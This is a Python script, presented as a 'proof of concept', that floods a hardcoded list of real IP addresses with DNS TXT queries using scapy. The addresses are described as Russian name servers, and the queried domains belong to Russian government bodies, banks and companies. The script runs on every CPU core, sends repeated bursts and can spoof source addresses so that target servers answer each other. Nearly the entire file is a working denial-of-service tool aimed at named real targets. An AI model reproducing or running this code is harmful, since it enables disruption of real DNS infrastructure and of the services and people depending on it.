#!/usr/bin/env python3

# requires scapy
# python3 -m pip install scapy[basic]

print("======= FPP:POC-DNS-Flood =======")
print("This is a proof of concept attack that floods DNS servers, run at your own risk.")
print("Starting to send UDP packets to bad Russian name servers...")
print("")

import os
import json
import random
import time
import multiprocessing
from scapy.all import conf, send, IP, UDP, DNS, DNSQR, RandShort


FPP_INTERVAL_MS = float(os.getenv("FPP_INTERVAL_MS", "500")) / 1000
DO_PRINT = os.getenv("DO_PRINT", "t").lower().startswith("t")
SPOOF_SRC = os.getenv("SPOOF_SRC", "f").lower().startswith("t")

print("FPP_INTERVAL_MS:", FPP_INTERVAL_MS)
print("DO_PRINT:", DO_PRINT)
print("SPOOF_SRC:", SPOOF_SRC)
print("")

def udpsend(e):
    counter = 0
    s = conf.L3socket()
    while (1):
        ns_ips = ['77.108.76.151', '77.108.76.150', '77.108.76.84', '212.11.159.250', '185.173.0.100', '62.112.117.5', '109.207.2.218', '213.59.255.175', '91.217.20.1', '91.217.21.1', '95.173.128.77', '95.173.128.80', '82.202.189.243', '82.202.189.205', '46.61.214.94', '213.59.255.110', '46.61.230.203', '195.161.52.77', '195.161.53.77', '81.177.103.95', '91.217.20.5', '91.217.21.5', '81.177.103.97', '194.58.196.62', '217.151.130.34', '217.151.128.34', '217.151.128.35', '185.42.137.111', '212.38.97.3', '95.171.228.170', '95.171.228.169', '95.171.232.172', '95.171.232.171', '95.171.236.173', '95.171.236.174', '82.118.131.110', '193.19.170.216', '193.19.171.216', '91.209.147.15', '91.209.147.3', '185.117.144.250', '185.150.12.22', '194.85.178.60', '212.243.120.8', '13.95.234.31', '194.85.178.51', '81.20.194.3', '91.239.98.42', '91.239.98.38', '13.80.145.65', '217.175.18.117', '217.175.25.190', '91.206.222.72', '91.206.222.71', '87.229.182.142', '195.135.239.1', '195.14.51.166', '195.14.56.16', '93.158.134.1', '213.180.193.1', '93.157.61.11', '93.157.61.12', '195.206.48.118', '185.14.70.31', '80.82.164.9', '195.82.136.177', '80.82.164.10', '195.82.137.177', '194.67.2.109', '194.54.14.186', '84.252.147.118', '84.252.147.119', '194.67.7.1', '194.54.14.187', '185.179.147.25', '193.164.146.169', '185.179.145.22', '193.164.146.165', '195.242.83.129', '195.225.39.8', '195.225.38.8']
        if SPOOF_SRC:
            src_ip = random.choice(ns_ips)
        else:
            src_ip = "[EXT]"
        dst_ip = random.choice(ns_ips)

        domains = ['fuckpussyputin.ru', 'customs.gov.ru', 'mos.ru', 'gosuslugi.ru', 'kremlin.ru', 'government.ru', 'mil.ru', 'nalog.gov.ru', 'pfr.gov.ru', 'rkn.gov.ru', 'gazprom.ru', 'lukoil.ru', 'magnit.ru', 'nornickel.com', 'surgutneftegas.ru', 'tatneft.ru', 'evraz.com', 'nlmk.com', 'sibur.ru', 'severstal.com', 'metalloinvest.com', 'nangs.org', 'group.ru', 'ya.ru', 'polymetalinternational.com', 'uralkali.com', 'eurosib.ru', 'omk.ru', 'sberbank.ru', 'vtb.ru', 'gazprombank.ru']
        dst_domain = random.choice(domains)

        if DO_PRINT:
            counter += 1
            print(counter, "From:", src_ip, "To:", dst_ip, "Query:", dst_domain)
        try:
            ip_opts = {"dst": dst_ip}
            if SPOOF_SRC:
                ip_opts["src"] = src_ip
            pkt = IP(**ip_opts)/UDP(sport=53, dport=53)/DNS(id=RandShort(),rd=1,qd=DNSQR(qname=dst_domain,qtype="TXT"))
            for a in range(0,20):
                s.send(pkt)
        except Exception as e:
            print(e)

        time.sleep(FPP_INTERVAL_MS)

if __name__ == '__main__':
    cc = multiprocessing.cpu_count()
    with multiprocessing.Pool() as p:
        p.map(udpsend, [None]*cc)
